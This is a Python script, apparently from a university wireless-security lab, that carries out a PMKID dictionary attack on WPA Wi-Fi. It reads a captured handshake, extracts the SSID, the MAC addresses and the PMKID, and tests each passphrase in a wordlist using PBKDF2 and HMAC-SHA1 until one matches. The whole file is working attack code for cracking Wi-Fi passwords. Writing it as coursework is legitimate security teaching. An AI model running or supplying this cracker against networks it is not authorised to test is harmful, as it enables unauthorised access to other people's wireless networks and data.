#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Modifié par:
# Anthony Coke
# Guilain Mbayo
# Mehdi Salhi


"""
Execute the PMKID attack with a wordlist to find the WiFi passphrase

Calcule le PMKID en se basant sur les adresses mac du client, de l'AP, de la passphrase devinée,
du SSID récupéré et d'une constante 'PKM Name'.
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import binascii
                      
# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

# In the capture, we see a lot of beacon frames. We can get the AP mac address from one of these

beacons = [pkt for pkt in wpa if pkt.haslayer(Dot11Beacon)]
first_beacon = beacons[0]

# Get SSID
ssid = first_beacon.info

# Get the AP mac from the beacon frame
APmac = a2b_hex(first_beacon.addr2.replace(":", ""))

# Find the first handshake packet from the AP which contains the PMKID
first_handshake = ""

for pkt in wpa:
	if pkt.haslayer(EAPOL):
		SRCmac = a2b_hex(pkt.addr2.replace(":", ""))
		if APmac == SRCmac:
			first_handshake = pkt
			break

# Get Client mac address from the first packet of handshake
Clientmac = a2b_hex(first_handshake.addr1.replace(":", ""))

# We can see on Wireshark that the PMKID begins at 20 bytes before the end of the frame and ends 4 bytes before the end. The last four bytes of the frame are the FSC.
pmkid_real = raw(first_handshake)[-20:-4]


# Now we iterate through the word list to find the correct passphrase

guesslist = open("wordlist.txt", "r")


for guess in guesslist.readlines():

    # Remove line return char to avoid further problems
    cleaned_guess = guess.strip()
    
    # Compute the PMK key from passphrase using pbkfd2 provided function
    pmk_guess = pbkdf2(hashlib.sha1, str.encode(cleaned_guess) , ssid, 4096, 32)

    # Compute pmkid following this formula : PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | 	MAC_STA)
    pmkid_hmac = hmac.new(pmk_guess, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
    
    # Compare real pmkid with computed pmkwid
    pmkid_computed = pmkid_hmac.digest()[:16]
    
    if  pmkid_computed == pmkid_real:
    
        print ("Correspondance détectée : ", cleaned_guess)
        exit(0)
        
print("Pas de correspondance détectée")








